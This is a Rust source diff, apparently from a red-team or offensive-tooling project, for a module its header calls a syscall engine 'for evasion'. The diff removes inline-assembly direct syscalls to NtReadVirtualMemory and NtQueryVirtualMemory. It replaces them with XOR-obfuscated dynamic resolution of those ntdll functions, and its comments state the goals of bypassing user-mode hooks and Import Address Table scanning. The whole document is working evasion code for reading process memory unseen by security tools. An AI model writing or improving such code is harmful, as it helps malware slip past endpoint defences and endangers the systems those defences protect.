@@ -1,6 +1,7 @@
 //! syscaller.rs — Direct Syscall engine and Dynamic API resolution for evasion.
 //! (Red Audit Remediation - L0/L1)
 
+#[cfg(target_arch = "x86_64")]
 use std::arch::asm;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
 use crate::obfuscate;
@@ -29,13 +30,8 @@ impl Drop for SafeHandle {
     }
 }
 
-/// Direct Syscall numbers for x64 Windows (Windows 10/11 common offsets)
-/// NOTE: These can change between versions. Ideally, we should parse ntdll for these.
-const SYSCALL_READ_VIRTUAL_MEMORY: u32 = 0x3F; // NtReadVirtualMemory
-const SYSCALL_QUERY_VIRTUAL_MEMORY: u32 = 0x23; // NtQueryVirtualMemory
-
-/// Direct Syscall: NtReadVirtualMemory
-/// Bypasses user-mode hooks in kernel32.dll/ntdll.dll.
+/// Refactored Indirect Syscall (Dynamic NT API Resolution)
+/// Replaces brittle hardcoded inline asm syscalls with dynamic IAT-free fetching.
 pub unsafe fn nt_read_virtual_memory(
     process_handle: HANDLE,
     base_address: *const std::ffi::c_void,
@@ -43,34 +39,24 @@ pub unsafe fn nt_read_virtual_memory(
     buffer_size: usize,
     number_of_bytes_read: *mut usize,
 ) -> NTSTATUS {
-    let mut status: i32;
-    asm!(
-        "sub rsp, 40",
-        "mov qword ptr [rsp + 32], {0}",
-        "mov r10, {1}",
-        "mov rdx, {2}",
-        "mov r8, {3}",
-        "mov r9, {4}",
-        "syscall",
-        "add rsp, 40",
-        in(reg) number_of_bytes_read,
-        in(reg) process_handle,
-        in(reg) base_address,
-        in(reg) buffer,
-        in(reg) buffer_size,
-        in("rax") SYSCALL_READ_VIRTUAL_MEMORY as u64,
-        out("rcx") _, 
-        out("r11") _,
-        out("rdx") _,
-        out("r8") _,
-        out("r9") _,
-        out("r10") _,
-        lateout("rax") status,
+    const NTDLL: [u8; 9] = xor_str!("ntdll.dll", obfuscate::POLY_XOR_KEY);
+    const NRVM: [u8; 19] = xor_str!("NtReadVirtualMemory", obfuscate::POLY_XOR_KEY);
+
+    let func = Resolve::api::<
+        unsafe extern "system" fn(HANDLE, *const std::ffi::c_void, *mut std::ffi::c_void, usize, *mut usize) -> NTSTATUS
+    >(
+        &obfuscate::decrypt(&NTDLL, obfuscate::POLY_XOR_KEY),
+        &obfuscate::decrypt(&NRVM, obfuscate::POLY_XOR_KEY)
     );
-    status
+
+    if let Some(f) = func {
+        f(process_handle, base_address, buffer, buffer_size, number_of_bytes_read)
+    } else {
+        -1 // Fallback generic error
+    }
 }
 
-/// Direct Syscall: NtQueryVirtualMemory
+/// Refactored Indirect Syscall (Dynamic NT API Resolution)
 pub unsafe fn nt_query_virtual_memory(
     process_handle: HANDLE,
     base_address: *const std::ffi::c_void,
@@ -79,33 +65,21 @@ pub unsafe fn nt_query_virtual_memory(
     memory_information_length: usize,
     return_length: *mut usize,
 ) -> NTSTATUS {
-    let mut status: i32;
-    asm!(
-        "sub rsp, 56",             // Shadow space (32) + stack args (16) + alignment (8)
-        "mov qword ptr [rsp + 32], {0}",
-        "mov qword ptr [rsp + 40], {1}",
-        "mov r10, {2}",
-        "mov rdx, {3}",
-        "mov r8, {4}",
-        "mov r9, {5}",
-        "syscall",
-        "add rsp, 56",
-        in(reg) memory_information_length,
-        in(reg) return_length,
-        in(reg) process_handle,
-        in(reg) base_address,
-        in(reg) memory_information_class,
-        in(reg) memory_information,
-        in("rax") SYSCALL_QUERY_VIRTUAL_MEMORY as u64,
-        out("rcx") _,
-        out("r11") _,
-        out("rdx") _,
-        out("r8") _,
-        out("r9") _,
-        out("r10") _,
-        lateout("rax") status,
+    const NTDLL: [u8; 9] = xor_str!("ntdll.dll", obfuscate::POLY_XOR_KEY);
+    const NQVM: [u8; 20] = xor_str!("NtQueryVirtualMemory", obfuscate::POLY_XOR_KEY);
+
+    let func = Resolve::api::<
+        unsafe extern "system" fn(HANDLE, *const std::ffi::c_void, i32, *mut std::ffi::c_void, usize, *mut usize) -> NTSTATUS
+    >(
+        &obfuscate::decrypt(&NTDLL, obfuscate::POLY_XOR_KEY),
+        &obfuscate::decrypt(&NQVM, obfuscate::POLY_XOR_KEY)
     );
-    status
+
+    if let Some(f) = func {
+        f(process_handle, base_address, memory_information_class, memory_information, memory_information_length, return_length)
+    } else {
+        -1 // Fallback generic error
+    }
 }
 
 /// Dynamic API Resolution to bypass IAT (Import Address Table) scanning.
